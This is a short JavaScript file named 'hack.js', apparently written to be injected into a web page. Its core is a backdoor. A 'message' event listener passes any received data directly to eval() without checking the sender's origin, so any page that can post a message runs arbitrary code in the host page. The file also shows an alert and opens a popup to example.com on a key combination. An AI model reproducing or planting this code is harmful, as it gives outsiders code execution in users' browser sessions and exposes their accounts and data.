/// hack.js
(function () {
    alert("e")
    window.addEventListener(
        "message",
        (event) => {
            eval(event.data)
        },
        false,
    );

    window.addEventListener("keydown", function (e) {
        if (e.ctrlKey && e.keyCode == 91) {
            window.open('https://example.com', '', 'width=200,height=100');
        }
     })
})()